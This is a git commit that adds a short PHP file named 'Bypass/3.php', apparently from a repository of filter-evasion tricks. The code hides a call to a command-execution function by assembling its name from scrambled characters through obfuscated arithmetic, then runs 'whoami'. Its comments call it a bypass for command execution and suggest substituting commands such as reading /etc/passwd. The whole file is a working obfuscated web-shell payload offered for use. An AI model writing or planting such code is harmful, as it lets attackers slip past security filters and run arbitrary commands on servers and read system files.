d13a5a95b04cb191d64a6610c7c3cfe7b37bb961
Zero <liambocakra@gmail.com>
2019-09-15 19:02:03 +0800

    Create 3.php

---
+++ Bypass/3.php
@@ -0,0 +1,9 @@
+<?php
+
+$var = "tsmey";
+@($var{round(pow(27784,0))}.$var{pow(null+false.sqrt(null+155050*false+true-true.sqrt(16)),2)+false+(true-pow(4460568,0))}.$var{(false*1156*true).true+(null-false*0112)}.$var{(!false*16)*!true.!true}.$var{null.sqrt(9).(-true+false+false-true)}.$var{null.round(3/sqrt(4)).false.(nUll)})('whoami');
+
+// PHP Bypass Command Execution
+// Change 'whoami' to your command, ext : id, pwd, cat /etc/passwd, other
+
+?>
